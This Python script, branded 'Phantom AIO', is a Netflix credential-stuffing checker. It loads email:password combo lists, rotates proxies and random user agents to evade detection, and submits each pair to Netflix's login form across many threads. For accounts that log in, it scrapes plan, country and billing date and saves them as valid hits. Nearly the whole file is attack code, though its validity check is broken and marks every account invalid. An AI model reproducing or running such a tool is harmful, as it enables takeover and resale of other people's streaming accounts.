import os, sys, time, random, string, json, ctypes, concurrent.futures
import requests
import tls_client
import fake_useragent
import bs4
import colorama
import datetime
import threading

from json import dumps
from requests import Session
from random import choice
from fake_useragent import UserAgent as ua
from bs4 import BeautifulSoup as Soup
from colorama import Fore, Style
    
red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT

colorama.init()
print()

valid = 0
invalid = 0
proxy_error = 0
accounts_processed = 0
check_proxy = 0
custom = 0

start_time = time.time()
ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ Netflix Checker | Valid : {valid} | Invalid : {invalid} | Proxy Error : {proxy_error}')

def update_console_title():
    global valid, invalid, proxy_error, start_time, accounts_processed
    current_time = time.time()
    elapsed_time = current_time - start_time
    cpm = int((accounts_processed / elapsed_time) * 60)
    ctypes.windll.kernel32.SetConsoleTitleW(f'『 Phantom AIO 』 ~ Netflix Checker | Valid : {valid} | Invalid : {invalid} | Proxy Error : {proxy_error} | CPM : {cpm}')
    
def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

def netflix_checker(email, password):
    global valid, invalid, accounts_processed, proxy_error, check_proxy
    proxy = choice(open("proxies.txt", "r").readlines()).strip() if len(
        open("proxies.txt", "r").readlines()) != 0 else None

    session = Session()

    proxy = (choice(open("./proxies.txt", "r").readlines()).strip()
             if len(open("./proxies.txt", "r").readlines()) != 0
             else None)
    if ":" in proxy and len(proxy.split(":")) == 4:
        ip, port, user, pw = proxy.split(":")
        proxy_string = f"http://{user}:{pw}@{ip}:{port}"
    else:
        ip, port = proxy.split(":")
        proxy_string = f"http://{ip}:{port}"

    session.proxies = {
        "http": proxy_string,
        "https": proxy_string
    }

    try:
        headers = {
            "User-Agent": ua().random
        }
        r = session.get("https://www.netflix.com/login", headers=headers)
        soup = Soup(r.text,'html.parser')
        loginForm = soup.find('form')
        auth = loginForm.find('input', {'name': 'authURL'}).get('value')
        
        headers = {
            "user-agent": ua().random,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": "https://www.netflix.com/login",
            "content-type": "application/x-www-form-urlencoded",
            "cookie":""
        }

        payload = {
            "userLoginId:": email,
            "password": password,
            "rememberMeCheckbox": "true",
            "flow": "websiteSignUp",
            "mode": "login",
            "action": "loginAction",
            "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
            "authURL": auth,
            "nextPage": "https://www.netflix.com/browse",
            "countryCode": "+1",
            "countryIsoCode": "US"
        }  
        
        log = session.post("https://www.netflix.com/login", headers=headers, data=payload)
        cookies = dict(flwssn=session.get("https://www.netflix.com/login", headers ={"User-Agent": ua().random}).cookies.get("flwssn"))
        if 'Sorry, we can\'t find an account with this email address. Please try again or' or 'Incorrect password' in log.text:
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            invalid += 1
            accounts_processed += 1
            update_console_title()
        else:
            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
                "Host": "www.netflix.com",
                "Referer": "https://www.netflix.com/browse",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": ua().random
            }
            info = session.get("https://www.netflix.com/YourAccount", headers=headers, cookies=cookies).text
            plan = info.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
            country = info.split('","currentCountry":"')[1].split('"')[0]
            expiry = info.split('data-uia="nextBillingDate-item">')[1].split('<')[0]
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            folder = "Checked/Netflix"
            if not os.path.exists(folder):
                os.makedirs(folder)
            with open("Checked/Netflix/good_netflix.txt", "a+", encoding='utf-8') as premium_file:
                premium_file.write(f"{email}:{password} | Plan : {plan} | Country : {country} | Expiry Date : {expiry}" + "\n")
            valid += 1
            accounts_processed += 1
            update_console_title()
    except:
        check_proxy += 1

        if check_proxy % 10 == 0:
            proxy_error += 1

        update_console_title()
        netflix_checker(email, password)

accounts = []

with open('combos.txt', 'r', errors='ignore') as file:
    for line in file:
        if ':' in line:
            email, password = line.rsplit(':', 1)
            accounts.append((email.strip(), password.strip()))

def process_account(email, password):
    netflix_checker(email, password)

def start_threads():
    threads = []
    for email, password in accounts:
        thread = threading.Thread(target=process_account, args=(email, password))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

max_threads = 500

start_threads()